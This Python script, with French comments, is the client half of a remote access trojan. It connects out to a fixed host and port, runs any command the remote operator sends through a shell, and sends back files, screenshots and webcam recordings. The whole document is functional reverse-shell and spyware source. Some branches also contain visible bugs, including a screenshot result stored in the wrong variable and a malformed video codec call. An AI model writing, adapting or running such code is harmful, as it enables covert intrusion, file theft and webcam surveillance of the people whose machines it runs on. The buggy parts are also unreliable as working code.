import socket
import time
import subprocess
import os
import platform
from PIL import ImageGrab
import cv2


HOST_IP = "192.168.1.21"
HOST_PORT = 32000
MAX_DATA_SIZE = 1024



print(f"Connection au serveur {HOST_IP}, port {HOST_PORT}...")
while True:
    try :
        s = socket.socket()
        s.connect((HOST_IP, HOST_PORT))

    except ConnectionRefusedError:
        # print("ERREUR: impossible de se connecter au serveur")
        time.sleep(1)
    else:
        # print("Connecté au serveur")
        break;

"""def envoyer_un_message():
    texte = input("Vous ")
    s.sendall(texte.encode())
def recevoir_des_messages():
    data_recues = s.recv(MAX_DATA_SIZE)
    if not data_recues:
        return None
    print("Message : ", data_recues.decode())"""

while True:
    commande_data = s.recv(MAX_DATA_SIZE)
    if not commande_data:
        break
    commande = commande_data.decode()
    cmd_split = commande.split(" ")
    if commande == "exit":
        break
    if commande == "infos":
        texte = platform.platform() + " " + os.getcwd()
        texte = texte.encode()
    elif len(cmd_split) == 2 and cmd_split[0] == "cd":
        try:
            os.chdir(cmd_split[1].strip("'"))
            texte = " "
        except FileNotFoundError:
            texte = "ERREUR: rentrer un répertoir valide"
        texte = texte.encode()
    elif len(cmd_split) == 2 and cmd_split[0] == "dl":
        try:
            f = open(cmd_split[1], "rb")
        except FileNotFoundError:
            texte = " "
            texte = texte.encode()
        else:
            texte = f.read()
            f.close()

    elif len(cmd_split) == 2 and cmd_split[0] == "capture":
        capture_ecran = ImageGrab.grab()
        capture_filename = cmd_split[1] + ".png"
        capture_ecran.save(capture_filename, "PNG")
        try:
            f = open(capture_filename, "rb")
        except FileNotFoundError:
            reponse = " ".encode()
        else:
            reponse = f.read()

    elif len(cmd_split) == 3 and cmd_split[0] == "webcam":
        cam = cv2.VideoCapture(0)
        largeur_image = int(cam.get(cv2.CAP_PROP_FRAME_WIDTH))
        hauteur_image = int(cam.get(cv2.CAP_PROP_FRAME_HEIGHT))
        nouvelle_video = []
        t = False
        for i in range(25*int(cmd_split[2])):
            ret, image = cam.read()
            if ret:
                nouvelle_video.append(image)
                t = True

            else:
                texte = " "
                texte.encode()
        if t:
            fourcc=cv2.VideoWriter_fourcc( "m", "p", "4","vb")
            video = cv2.VideoWriter(cmd_split[1]+'.mp4',fourcc,24,(largeur_image,hauteur_image))
            for images in nouvelle_video :
                video.write(images)
            video.release()
            v = open(cmd_split[1]+".mp4", "rb")
            texte = v.read()
            v.close()

    
    else:
        resultat = subprocess.run(commande, shell=True, capture_output=True, universal_newlines=True)
        texte = resultat.stdout + resultat.stderr

        if not texte or len(texte)==0:
            texte = " "
        texte = texte.encode()
    data_len = len(texte)
    header = str(data_len).zfill(13)
    print("header:", header)
    s.sendall(header.encode())
    if data_len>0:
        s.sendall(texte)

s.close()

